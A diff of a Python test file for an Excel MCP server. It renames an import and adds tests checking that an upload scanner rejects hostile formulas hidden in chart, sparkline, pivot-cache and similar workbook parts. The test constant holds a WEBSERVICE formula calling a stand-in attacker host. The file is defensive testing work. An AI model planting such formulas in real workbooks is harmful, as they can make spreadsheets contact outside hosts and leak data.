@@ -12,7 +12,7 @@ from openpyxl import Workbook
 from excel_mcp.config import Limits
 from excel_mcp.errors import ExcelMCPError
 from excel_mcp.operations.files import decode_workbook
-from excel_mcp.package import scan_package
+from excel_mcp.upload_scan import scan_package
 from tests.conftest import ToolCall
 
 ATTACK = 'WEBSERVICE("https://attacker.example")'
@@ -131,7 +131,7 @@ class _Endless:
 
 
 def test_limits_are_enforced_while_reading_whatever_the_header_says() -> None:
-    from excel_mcp.package import _Entry  # pyright: ignore[reportPrivateUsage]
+    from excel_mcp.upload_scan import _Entry  # pyright: ignore[reportPrivateUsage]
 
     info = zipfile.ZipInfo("x.xml")
     info.compress_size = 10**9  # a header that hides the real size
@@ -170,3 +170,75 @@ def test_lenient_legacy_drawings_are_accepted_but_broken_xml_parts_are_not() -> 
     vml = b"<xml><v:textbox><div>line<br>next</div></v:textbox></xml>"
     _decode(_package([("xl/drawings/vmlDrawing1.vml", vml)]))
     assert "not valid XML" in _rejected(_package([("xl/extra.xml", vml)]))
+
+
+PRESERVED_PARTS = [
+    "xl/charts/chartEx1.xml",
+    "xl/slicers/slicer1.xml",
+    "xl/slicerCaches/slicerCache1.xml",
+    "xl/timelines/timeline1.xml",
+    "xl/threadedComments/threadedComment1.xml",
+    "xl/metadata.xml",
+    "customXml/item1.xml",
+    "xl/pivotCache/pivotCacheDefinition1.xml",
+]
+
+
+_NAMESPACES = 'xmlns:cx="urn:chartex" xmlns:x14="urn:x14" xmlns:xm="urn:xm"'
+_QUOTED = ATTACK.replace('"', "&quot;")
+
+
+@pytest.mark.parametrize("name", PRESERVED_PARTS)
+@pytest.mark.parametrize(
+    "body",
+    [
+        f"<cx:chartSpace {_NAMESPACES}><cx:f>{ATTACK}</cx:f></cx:chartSpace>",
+        f"<root {_NAMESPACES}><x14:sparkline><xm:f>{ATTACK}</xm:f></x14:sparkline></root>",
+        f'<root><cacheField name="x" formula="{_QUOTED}"/></root>',
+        f'<root><calculatedItem formula="{_QUOTED}"/></root>',
+        f"<root><formula1>{ATTACK}</formula1></root>",
+    ],
+)
+def test_hostile_formulas_in_preserved_parts_are_found(name: str, body: str) -> None:
+    assert "not allowed" in _rejected(_package([(name, body.encode())]))
+
+
+def test_pivot_formulas_are_checked_for_safety_but_not_for_syntax() -> None:
+    cache = b'<root><cacheField name="x" formula="&apos;Total Sales&apos;*2+Region[North]"/></root>'
+    _decode(_package([("xl/pivotCache/pivotCacheDefinition1.xml", cache)]))
+
+
+async def test_a_workbook_with_everything_the_server_can_add_is_accepted(
+    call: ToolCall, sample: Path
+) -> None:
+    book = {"path": "sales.xlsx"}
+    await call("create_table", **book, sheet="Data", range="A1:D5", name="Sales")
+    await call("add_sparklines", **book, sheet="Data", range="F2:F5", source="C2:D5")
+    await call(
+        "create_chart",
+        **book,
+        sheet="Report",
+        chart_type="waterfall",
+        series=[{"values": "Data!C2:C5", "name": "Data!C1", "categories": "Data!A2:A5"}],
+        at="B2",
+    )
+    await call(
+        "create_pivot_table",
+        **book,
+        source="Data!A1:D5",
+        sheet="Report",
+        at="L1",
+        row_fields=["Region"],
+        value_fields=[{"field": "Revenue"}],
+        calculated_fields=[{"name": "Revenue", "formula": "=Units*Price"}],
+    )
+    await call(
+        "add_slicer",
+        **book,
+        sheet="Data",
+        target={"sheet": "Data", "name": "Sales"},
+        field="Region",
+        at="H2",
+    )
+
+    _decode(sample.read_bytes())
